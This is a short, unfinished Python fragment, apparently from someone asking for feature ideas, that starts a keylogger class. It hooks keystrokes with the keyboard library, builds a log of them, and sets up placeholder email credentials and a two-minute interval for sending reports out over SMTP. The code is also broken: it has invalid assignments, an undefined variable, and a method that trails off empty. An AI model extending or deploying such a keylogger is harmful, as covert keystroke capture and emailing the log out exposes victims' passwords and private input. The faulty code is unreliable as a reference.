# will be creating a simple key logger and need some ideas on what other features I could implement on it

import smtplib
import keyboard

from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 120
EMAIL_ADDRESS = "FAKEEMAILHERE"
EMAIL_PASSWORD = "FAKEPASSWORD"

class Keylogger :
    def __init__(self,interval,report_method = "email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt() = datetime()
        self.end_dt() = datetime()


    def callback (self,event):
        key = event.name
        if len(key)>1:
            if key == "space":
                key = " "
            elif key == "enter":
                key = "[ENTER]\n"
            elif key == "decimal":
                key = "."
            else:
                key = key.replace(" "," _")
                key = f"[{name.upper()}]"
        self.log += key    

    def update_filename(self):
        
